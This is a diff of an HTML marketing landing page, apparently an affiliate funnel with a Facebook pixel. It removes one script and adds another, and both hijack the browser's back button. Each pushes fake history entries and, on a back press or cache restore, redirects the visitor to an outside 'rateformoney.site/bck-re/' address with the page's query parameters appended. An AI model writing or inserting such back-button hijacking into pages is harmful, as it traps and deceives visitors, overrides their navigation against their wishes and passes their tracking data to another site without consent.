@@ -46,30 +46,7 @@ src="https://www.facebook.com/tr?id=1500737450626183&ev=PageView&noscript=1"
       })(window, performance);
     </script>
 
-					<script>
-  const link = 'https://rateformoney.site/bck-re/';
-
-  function setBackRedirect(url) {
-    let urlBackRedirect = url;
-    urlBackRedirect = urlBackRedirect =
-      urlBackRedirect.trim() +
-      (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
-      document.location.search.replace('?', '').toString();
-
-    history.pushState({}, '', location.href);
-    history.pushState({}, '', location.href);
-    history.pushState({}, '', location.href);
-
-    window.addEventListener('popstate', () => {
-      console.log('onpopstate', urlBackRedirect);
-      setTimeout(() => {
-        location.href = urlBackRedirect;
-      }, 1);
-    });
-  }
-
-  setBackRedirect(link);
-</script>
+					
     
     <link rel="dns-prefetch" href="https://cdn.converteai.net" />
     <link rel="dns-prefetch" href="https://scripts.converteai.net" />
@@ -428,5 +405,43 @@ src="https://www.facebook.com/tr?id=1500737450626183&ev=PageView&noscript=1"
         </button>
       </div>
     </div>
+
+	  <!-- SCRIPT BACKREDIRECT -->
+	  <script>
+document.addEventListener("DOMContentLoaded", function () {
+  const backUrl = "https://rateformoney.site/bck-re/";
+
+  function handleBackRedirect() {
+    let url = backUrl.trim();
+    if (location.search) {
+      url += (url.includes("?") ? "&" : "?") + location.search.substring(1);
+    }
+
+    console.log("Back redirect triggered:", url);
+
+    
+    setTimeout(() => window.location.assign(url), 10);
+  }
+
+  
+  setTimeout(() => {
+    for (let i = 0; i < 3; i++) {
+      history.pushState({}, "", location.href);
+    }
+
+    
+    window.removeEventListener("popstate", handleBackRedirect);
+    window.addEventListener("popstate", handleBackRedirect);
+
+    
+    window.addEventListener("pageshow", (e) => {
+      if (e.persisted) handleBackRedirect();
+    });
+
+    console.log("✅ Backredirect initialized for:", backUrl);
+  }, 500); 
+});
+</script>
+	  
   </body>
 </html>
